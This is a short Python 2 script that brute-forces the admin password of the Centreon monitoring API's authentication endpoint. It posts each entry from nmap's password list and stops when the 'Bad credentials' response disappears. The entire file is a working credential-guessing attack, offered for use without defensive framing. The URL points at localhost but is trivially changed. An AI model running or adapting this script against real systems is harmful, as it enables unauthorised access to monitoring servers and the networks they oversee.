# ORIGINAL Code By ihebski
# Edited By m3dsec
import requests
import sys

url = "http://127.0.0.1/centreon/api/index.php?action=authenticate"
expression = "Bad credentials"

def brute(username,password):
	data = {'username':username,'password':password}
	r = requests.post(url,data=data)
	if expression not in r.content :
		print "[+] Correct password Found: ",password
		sys.exit()
	else:
		print r.content," ",password

def main():
	words = [w.strip() for w in open("/usr/share/nmap/nselib/data/passwords.lst", "rb").readlines()] #parse wordlist
	# nmap wordlist work just fine
	for payload in words:
		brute("admin",payload)

if __name__ == '__main__':
	main()
